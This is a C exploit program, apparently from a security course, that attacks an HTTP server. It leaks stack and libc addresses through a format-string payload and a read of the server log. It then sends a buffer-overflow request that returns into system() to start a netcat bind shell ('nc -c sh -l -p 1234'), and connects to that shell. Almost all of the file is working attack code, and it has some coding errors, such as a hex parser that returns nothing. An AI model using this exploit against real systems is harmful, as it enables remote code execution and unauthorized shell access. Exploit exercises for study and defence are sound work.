#define _GNU_SOURCE 1
#define _XOPEN_SOURCE 700
#define ui unsigned int
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

static int connect_to(const char *hostname, const char *port)
{
	struct addrinfo hints;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;

	struct addrinfo *start;
	int ret = getaddrinfo(hostname, port, &hints, &start);
	if (ret != 0)
		return -1;
	int sock = -1;
	for (struct addrinfo *info = start; info; info = info->ai_next)
	{
		sock = socket(info->ai_family, info->ai_socktype,
			      info->ai_protocol);
		if (sock == -1)
			continue;

		if (connect(sock, info->ai_addr, info->ai_addrlen) != -1)
			break;
		close(sock);
		sock = -1;
	}
	freeaddrinfo(start);
	return sock;
}

/* This sends len bytes of data over the socket. It will call send(2)
 * over and over until one of the following happens:
 * - All of the data has been sent in which case it returns len;
 * - An error occurs in which case it returns -1; or
 * - The socket is closed in which case it returns the amount sent.
 * This does _not_ work with nonblocking sockets. */
static ssize_t sendn(int sock, const void *data, size_t len)
{
	ssize_t total = 0;
	while (len)
	{
		ssize_t amount = send(sock, data, len, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount == -1)
			return -1;
		if (amount == 0)
			break;
		data += amount;
		len -= amount;
		total += amount;
	}
	return total;
}

static void recv_response(int sock)
{
	char buf[4096];

	while (1)
	{
		ssize_t amount = recv(sock, buf, sizeof buf, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount <= 0)
			return;
		write(fileno(stdout), buf, amount);
	}
}

int getCharValue(char c){
	if ('0' <= c && c <= '9') return c - '0';
	else if ('a' <= c && c <= 'e') return c - 'a' + 10;
	else return c - 'A' + 10;
}
ui getAddrFromHexTring(char* str){
	ui addr = 0;
	for (int i = 0; i < 8; i++){
		addr = addr * 16 + getCharValue(str[i]);
	}

}
void getAddr(int sock, ui* addrToEbp, ui* addrToSNPrintf){
	FILE *fp = fdopen(sock, "r");
	char line[2][1024];
	int which = 0;
	while(!feof(fp) && !ferror(fp) && fgets(line[which], 1024, fp))
		which = !which;
	which = !which;
	fclose(fp);
	char* addr1 = strstr(line[which], "-X-")+3;
	*addrToEbp = getAddrFromHexTring(addr1) + 0x1040;
	char* addr2 = strstr(addr1, "-X-")+3;
	
	*addrToSNPrintf = 0;
	for (int i = 0; i < 4; i++){
		*addrToSNPrintf += ((unsigned char)addr2[i]) << (i*8);
	}
}
ui ebpDiff = 0;
char* intTocharArray(ui value){
	char *C = malloc(5*sizeof(char));
	for (int i = 0; i < 4; i++){
		C[i] = value & 0xff;
		value >>= 8;
	}
	C[4] = 0;
	return C;
}
void printHex(char* str){
	printf("****%08x\n", *(ui*)str);
}
int sploit1(ui addrToSystem, ui addrToEbp , char* argv[]){
	int sock = connect_to(argv[1], argv[2]);
	assert(sock != -1);

	char* makeItToZero = "\xdf\x34\xff\xbf"; //0xbfffe4df

	char *request;
	char get[1000] = "GET %s ";
	char *http = "HTTP/1.222222222222222222222222222222222123456789012345";
	char *savedEbp = intTocharArray(ebpDiff + 0xbfffe498);
	char *systemAddr = intTocharArray(addrToSystem); 
	printf("%s\n", addrToSystem);
	char *pad = "xxxxxxxx";
	char *exitAddr = "\x20\x43\xec\xb7";
	char *ptrToCMD = intTocharArray(0xbfffe84c + ebpDiff);
	printHex(ptrToCMD);
	char *validPtr = intTocharArray(ebpDiff + 0xbfffe4a4);
	char* validPtr2 = intTocharArray(ebpDiff + 0xbfffe478); 
	char *CMD = "                                            \
                                                                \
                                                                \
                                                   nc -c sh -l -p 1234 ;\n";
// http | validPtr| validPtr | validPtr | savedEbp | systemAddr | pad(8) | ptrToCMD | ptrToCMD | validPtr2 | CMD
	//							
	//char *exitAddr = "\xec\xb7\x04\x08";
	char *clientInfo = "\r\nHost: %s\r\n\r\n";
	printf("%d\n", strlen(http)+18);
	strcat(get, http);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
//begin
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);
	strcat(get, systemAddr);

//end


	strcat(get, savedEbp);
	strcat(get, systemAddr);

	//strcat(get, pad);
	//strcat(get, ptrToCMD);
	strcat(get, ptrToCMD);

	strcat(get, ptrToCMD);
	strcat(get, ptrToCMD);
	strcat(get, validPtr2);
	strcat(get, CMD);
	strcat(get, clientInfo);
	asprintf(&request, get , argv[3], argv[1]);
	sendn(sock, request, strlen(request));
	free(request);
	//recv_response(sock);
	//close(sock);

	sleep(3);
	execl("/bin/nc", "nc", "localhost", "1234", NULL);
	_exit(1);
	return 0;
}
int main(int argc, char *argv[])
{
	argv[3] = "\xe4\xb7\x04\x08-X-%2$08x-X-%20$s";
	if (argc != 4)
	{
		fprintf(stderr, "Usage: %s hostname port file\n", argv[0]);
		return EXIT_FAILURE;
	}
	int sock = connect_to(argv[1], argv[2]);
	assert(sock != -1);

	char *request;
	asprintf(&request, "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", argv[3], argv[1]);
	sendn(sock, request, strlen(request));
	free(request);
	recv_response(sock);

	sock = connect_to(argv[1], argv[2]);
	asprintf(&request, "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", "/server.log", argv[1]);
	sendn(sock, request, strlen(request));
	free(request);
	ui addrToSNPrintf, addr2Ebp;
	getAddr(sock, &addr2Ebp, &addrToSNPrintf);
	ui addrToSystem = addrToSNPrintf - 0xe240;
	close(sock);
	printf("%08x\n", addr2Ebp);
	ebpDiff = addr2Ebp - 0xe21ff778;
	printf("\nebpDiff:%08x\naddrToSystem:%08x\n", ebpDiff, addrToSystem);
	sploit1(addrToSystem, addr2Ebp , argv);
	return 0;
}
